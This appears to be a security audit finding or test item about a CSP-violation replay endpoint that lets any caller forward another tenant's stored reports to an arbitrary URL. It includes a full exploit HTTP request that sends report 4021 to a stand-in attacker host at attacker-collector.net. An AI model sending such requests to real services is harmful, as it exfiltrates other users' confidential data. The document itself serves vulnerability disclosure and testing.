diagnosis: ReplayCSPViolationWebhookView retrieves any stored CSPViolationRecord by report_id and forwards its full telemetry payload (document URI, user agent, blocked resource) to a user-supplied destination_url. An attacker can exfiltrate other tenants' confidential violation reports and internal session URLs to an external listener.
exploit_request:
POST /api/csp/reports/4021/replay/ HTTP/1.1
Host: security.infosec-hub.io
Authorization: Bearer attacker_token
Content-Type: application/json

{"destination_url": "https://attacker-collector.net/exfil"}
